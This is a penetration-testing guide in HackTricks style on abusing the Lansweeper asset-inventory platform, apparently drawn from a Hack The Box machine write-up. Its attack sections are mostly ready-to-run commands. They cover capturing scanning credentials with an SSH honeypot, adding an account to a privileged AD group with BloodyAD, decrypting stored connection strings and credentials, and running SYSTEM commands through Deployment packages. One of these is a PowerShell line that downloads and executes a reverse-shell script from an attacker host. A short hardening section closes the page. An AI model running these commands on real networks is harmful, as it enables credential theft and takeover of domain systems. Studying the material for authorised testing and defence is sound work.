# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper is an IT asset discovery and inventory platform commonly deployed on Windows and integrated with Active Directory. Credentials configured in Lansweeper are used by its scanning engines to authenticate to assets over protocols like SSH, SMB/WMI and WinRM. Misconfigurations frequently allow:

- Credential interception by redirecting a scanning target to an attacker-controlled host (honeypot)
- Abuse of AD ACLs exposed by Lansweeper-related groups to gain remote access
- On-host decryption of Lansweeper-configured secrets (connection strings and stored scanning credentials)
- Code execution on managed endpoints via the Deployment feature (often running as SYSTEM)

This page summarizes practical attacker workflows and commands to abuse these behaviors during engagements.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs, Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
  - Type: IP Range (or Single IP) = your VPN IP
  - Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
  - Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:

```yaml
# sshesame.conf
server:
  listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```

Validate captured creds against DC services:

```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```

Notes
- Works similarly for other protocols when you can coerce the scanner to your listener (SMB/WinRM honeypots, etc.). SSH is often the simplest.
- Many scanners identify themselves with distinct client banners (e.g., RebexSSH) and will attempt benign commands (uname, whoami, etc.).

## 2) AD ACL abuse: gain remote access by adding yourself to an app-admin group

Use BloodHound to enumerate effective rights from the compromised account. A common finding is a scanner- or app-specific group (e.g., “Lansweeper Discovery”) holding GenericAll over a privileged group (e.g., “Lansweeper Admins”). If the privileged group is also member of “Remote Management Users”, WinRM becomes available once we add ourselves.

Collection examples:

```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```

Exploit GenericAll on group with BloodyAD (Linux):

```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
  add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```

Then get an interactive shell:

```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```

Tip: Kerberos operations are time-sensitive. If you hit KRB_AP_ERR_SKEW, sync to the DC first:

```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```

## 3) Decrypt Lansweeper-configured secrets on the host

On the Lansweeper server, the ASP.NET site typically stores an encrypted connection string and a symmetric key used by the application. With appropriate local access, you can decrypt the DB connection string and then extract stored scanning credentials.

Typical locations:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
  - `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Use SharpLansweeperDecrypt to automate decryption and dumping of stored creds:

```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```

Expected output includes DB connection details and plaintext scanning credentials such as Windows and Linux accounts used across the estate. These often have elevated local rights on domain hosts:

```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```

Use recovered Windows scanning creds for privileged access:

```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```

## 4) Lansweeper Deployment → SYSTEM RCE

As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Execution is performed by the Lansweeper service with high privilege, yielding code execution as NT AUTHORITY\SYSTEM on the selected host.

High-level steps:
- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.
- Catch your shell as SYSTEM.

Example payloads (PowerShell):

```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```

OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Use judiciously.

## Detection and hardening

- Restrict or remove anonymous SMB enumerations. Monitor for RID cycling and anomalous access to Lansweeper shares.
- Egress controls: block or tightly restrict outbound SSH/SMB/WinRM from scanner hosts. Alert on non-standard ports (e.g., 2022) and unusual client banners like Rebex.
- Protect `Website\\web.config` and `Key\\Encryption.txt`. Externalize secrets into a vault and rotate on exposure. Consider service accounts with minimal privileges and gMSA where viable.
- AD monitoring: alert on changes to Lansweeper-related groups (e.g., “Lansweeper Admins”, “Remote Management Users”) and on ACL changes granting GenericAll/Write membership on privileged groups.
- Audit Deployment package creations/changes/executions; alert on packages spawning cmd.exe/powershell.exe or unexpected outbound connections.

## Related topics
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}